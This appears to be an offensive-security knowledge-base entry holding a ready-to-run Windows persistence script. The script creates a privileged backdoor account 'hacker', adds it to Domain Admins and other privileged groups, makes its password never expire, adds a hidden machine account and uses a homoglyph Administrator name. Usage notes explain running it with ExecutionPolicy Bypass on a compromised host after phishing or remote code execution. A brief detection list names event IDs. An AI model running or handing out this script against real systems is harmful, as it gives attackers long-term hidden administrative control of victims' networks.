---
type: code
language: powershell
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - persistence
  - account-creation
validated: true
---

# windows-backdoor-account-creation-script

## Code

```powershell
net user hacker Hcker_12345678* /add /Y
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add # RDP access
net localgroup "Backup Operators" hacker /add # Full access to files
net group "Domain Admins" hacker /add /domain

# enable a domain user account
net user hacker /ACTIVE:YES /domain

# prevent users from changing their password
net user username /Passwordchg:No

# prevent the password to expire
net user hacker /Expires:Never

# create a machine account (not shown in net users)
net user /add evilbob$ evilpassword

# homoglyph Aԁmіnistratοr (different of Administrator)
Aԁmіnistratοr
```

## Description

This PowerShell-executable script uses Windows net commands to create a local backdoor account named 'hacker', add it to local and domain privileged groups for persistence and escalation, configure the account to avoid password changes or expiration, create a hidden machine account, and reference a homoglyph administrator name for deceptive purposes. It is designed for post-exploitation in Windows environments to establish long-term access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Hardcoded usernames/passwords | The script uses fixed values like 'hacker', 'Hcker_12345678*', 'evilbob$'; edit the code before execution to customize | Replace 'hacker' with custom name, 'Hcker_12345678*' with secure password |

## Usage

Execute in PowerShell on a compromised Windows host with admin rights: `powershell -ExecutionPolicy Bypass -File backdoor.ps1`. This can be delivered via initial access vectors like phishing or remote code execution. After running, verify with `net user` and test login. Ideal for red team persistence in domain environments.

## Detection

- Windows Event Logs: Event ID 4720 (user created), 4732 (added to group), 4728 (password changed).
- Sysmon: Process creation for net.exe or powershell.exe with command-line arguments containing user/group mods.
- EDR alerts on homoglyph names or unusual account creations; monitor for machine accounts ($ suffix).

## Related

- [[procedures/windows-credential-enumeration]]
- [[techniques/Create Account|T1136]]
